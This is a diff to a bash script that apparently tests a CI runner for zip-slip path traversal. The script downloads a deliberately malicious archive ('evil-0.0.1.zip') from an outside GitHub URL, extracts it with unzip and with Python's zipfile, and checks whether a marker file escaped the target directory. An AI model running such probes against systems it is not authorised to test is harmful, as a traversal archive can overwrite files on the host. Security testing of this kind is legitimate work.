@@ -1,41 +1,53 @@
 #!/usr/bin/env bash
-echo "=== P1 RUNNER PYTHON PROBE ==="
+echo "=== P1 UNZIP TRAVERSAL TEST ==="
 echo "TIME=$(date +%H:%M:%S.%3N)"
+TMPDIR=/tmp/p1test_$$
+mkdir -p "$TMPDIR/unzip_dir"
 
-echo "--- list /usr/bin/runner/usr/bin/ ---"
-ls -la /usr/bin/runner/usr/bin/ 2>/dev/null | head -20 || echo "not found"
+echo "--- download evil zip ---"
+curl -sf --max-time 20 "https://raw.githubusercontent.com/v-vlasenko/base/master/fake-registry/evil-0.0.1.zip" \
+  -o "$TMPDIR/evil.zip" && echo "download OK" || echo "download FAILED"
 
-echo "--- find python in runner ---"
-find /usr/bin/runner/usr/bin/ -name "python*" -not -name "*.h" -not -name "*config*" 2>/dev/null
+echo "--- unzip -v to list entries ---"
+unzip -v "$TMPDIR/evil.zip" 2>&1
 
-RUNNER_PY=$(find /usr/bin/runner/usr/bin/ -name "python3*" -not -name "*.h" -not -name "*config*" 2>/dev/null | grep -v config | head -1)
-echo "Runner Python: $RUNNER_PY"
+echo "--- unzip to unzip_dir (NO -: flag) ---"
+unzip "$TMPDIR/evil.zip" -d "$TMPDIR/unzip_dir" 2>&1
 
-if [ -n "$RUNNER_PY" ]; then
-  echo "--- runner python shutil.which(unzip) ---"
-  "$RUNNER_PY" -c "
-import shutil, os, sys
-print('version:', sys.version.split()[0])
-print('PATH:', os.environ.get('PATH', '(none)'))
-unzip = shutil.which('unzip')
-print('shutil.which(unzip):', unzip)
-import subprocess
-res = subprocess.run(['which', 'unzip'], capture_output=True)
-print('subprocess which unzip:', res.stdout.decode().strip())
-" 2>&1
+echo "--- tree of extraction result ---"
+find "$TMPDIR" -mindepth 1 | sort 2>&1
 
-  echo "--- test zipfile traversal with runner python ---"
-  "$RUNNER_PY" -c "
-import zipfile, tempfile, pathlib
-with tempfile.TemporaryDirectory() as tmpdir:
-    dest = pathlib.Path(tmpdir) / 'unzip_dir'
-    dest.mkdir()
-    with zipfile.ZipFile('/tmp/evil_probe.zip', 'r') as z:
-        z.extractall(dest)
-    # List what was extracted
-    for f in sorted(pathlib.Path(tmpdir).rglob('*')):
-        print(f.relative_to(tmpdir))
-" 2>&1 || echo "no evil_probe.zip available"
+echo "--- did traversal escape? ---"
+if [ -f "$TMPDIR/providers/zipslip_CONFIRMED.txt" ]; then
+  echo "TRAVERSAL: file at TMPDIR/providers/ (relative escape)"
+  cat "$TMPDIR/providers/zipslip_CONFIRMED.txt"
+elif [ -f "$TMPDIR/unzip_dir/providers/zipslip_CONFIRMED.txt" ]; then
+  echo "SAFE: stripped to unzip_dir/providers/ (no escape)"
+  cat "$TMPDIR/unzip_dir/providers/zipslip_CONFIRMED.txt"
+else
+  echo "UNKNOWN: neither found"
 fi
 
+echo "--- test python 3.13 zipfile extractall ---"
+/usr/bin/runner/usr/bin/python3 -c "
+import zipfile, pathlib, tempfile, os
+dest = pathlib.Path('$TMPDIR') / 'py_extract'
+dest.mkdir()
+try:
+    with zipfile.ZipFile('$TMPDIR/evil.zip', 'r') as z:
+        z.extractall(dest)
+    extracted = list(dest.rglob('*'))
+    for f in sorted(extracted):
+        print(f.relative_to(dest))
+    if (dest / 'providers' / 'zipslip_CONFIRMED.txt').exists():
+        print('PYTHON TRAVERSAL: escaped to providers/')
+    elif (pathlib.Path('$TMPDIR') / 'providers' / 'zipslip_CONFIRMED.txt').exists():
+        print('PYTHON TRAVERSAL: escaped outside TMPDIR')
+    else:
+        print('PYTHON SAFE: no traversal escape')
+except Exception as e:
+    print('PYTHON ERROR:', type(e).__name__, str(e))
+" 2>&1
+
+rm -rf "$TMPDIR"
 echo "=== DONE ==="
